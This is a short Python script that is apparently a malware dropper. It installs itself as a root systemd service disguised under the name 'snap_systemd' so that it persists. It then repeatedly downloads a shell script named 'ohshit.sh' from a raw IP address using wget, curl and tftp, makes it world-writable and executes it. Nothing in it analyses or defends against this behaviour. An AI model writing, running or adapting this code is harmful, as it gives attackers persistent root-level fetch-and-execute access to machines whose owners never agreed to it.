import os
import sys
lol = sys.executable
kek = sys.argv
print(kek)

print(lol)


path = os.path.exists(f"/etc/systemd/system/snap_systemd.service")
if not path:
    print("Установка сервиса")
    with open(f'/etc/systemd/system/snap_systemd.service', 'w', encoding='utf-8') as file:
        file.write(f"""
[Unit]
Description=LP
After=network.target

[Service]
User=root
Group=www-data
WorkingDirectory={os.getcwd()}
ExecStart={lol} {kek[0]}
Type=forking

[Install]
WantedBy=multi-user.target


    """)
    os.system('systemctl enable snap_systemd')
    os.system('service snap_systemd restart')


fl1 = os.path.exists(f"{os.getcwd()}/ohshit.sh")
if not fl1:
    os.system('wget http://37.139.129.199/ohshit.sh')
os.system('curl -O http://37.139.129.199/ohshit.sh')
os.system('chmod 777 ohshit.sh')
os.system('sh ohshit.sh')
os.system('tftp 37.139.129.199 -c get ohshit.sh')
os.system('chmod 777 ohshit.sh')
os.system('sh ohshit.sh')


